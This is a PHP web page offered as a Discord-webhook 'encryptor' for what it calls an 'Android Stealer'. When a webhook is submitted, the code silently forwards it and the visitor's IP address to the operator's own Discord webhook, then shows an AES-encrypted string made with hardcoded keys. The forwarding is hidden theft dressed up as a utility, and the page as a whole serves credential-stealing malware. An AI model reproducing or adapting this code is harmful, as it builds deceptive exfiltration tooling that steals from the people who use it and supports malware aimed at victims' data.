
<html>
 <style>
      html, body {
        height:100%;
      }

      body {
        background : #15202b;
        color : #fff;
 
      }
    </style>
<head>
</head>
<body>
    
   <form action="" method="post">

Enter webhook:<br>
   <input type="text" name="id" value="" />
<br><br>
<input type="submit" name="submit" value="Submit" />
        </form>

    <?php
  
     if (isset($_POST['submit'])) {
         $id = $_POST['id'];
         
     
                    
            	    $Content = $id;
                    
                    if (strstr($Content, 'https://discord.com/api/webhooks/')) { 
                        $url = "YOUR WEBHOOK";
$hookObject = json_encode([
    
    "content" => "[Android Stealer] ".$_SERVER['REMOTE_ADDR']." webhook encrypted!",
    "username" => "SecureHook",
 
    "tts" => false,
 
    "embeds" => [
        [
           
            "title" => "New user",

           
            "type" => "rich",

           
            "description" => $Content,
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );
curl_close( $ch );
        
        function encrypt_decrypt($action, $string) {
            $output = false;

            $encrypt_method = "AES-256-CBC";
              $secret_key = 'YW5kcm9zdGVhbGVy';
              $secret_iv = 'yVGbhVGdz9mck5WY';
            $key = hash('sha256', $secret_key);
            
            $iv = substr(hash('sha256', $secret_iv), 0, 16);

            if ( $action == 'encrypt' ) {
                $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
                $output = base64_encode($output);
            } else if( $action == 'decrypt' ) {
                $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
            }

            return $output;
        }

        ?><br><br><?php
            $encrypted_txt = encrypt_decrypt('encrypt', $id);
            
        echo "output: " .$encrypted_txt. "\n";
            ?><br><br><?php
                }
                else
                {
                    echo("this is not a webhook lol");
                }
  
}
    ?>


</body>
</html>